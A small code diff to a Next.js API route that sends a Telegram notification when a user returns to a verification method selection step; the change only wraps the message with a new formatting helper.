@@ -1,5 +1,5 @@
 import { NextResponse } from 'next/server';
-import { sendTelegramMessage, getSiteName } from '@/lib/telegram';
+import { sendTelegramMessage, getSiteName, wrapFlowMessage } from '@/lib/telegram';
 
 function escapeHtml(s) {
   if (typeof s !== 'string') return '';
@@ -18,7 +18,7 @@ export async function POST(_request) {
       'User returned to verification method selection.',
     ].join('\n');
 
-    await sendTelegramMessage(message);
+    await sendTelegramMessage(wrapFlowMessage(message));
     return NextResponse.json({ ok: true });
   } catch (err) {
     console.error('notify-try-another-method:', err);
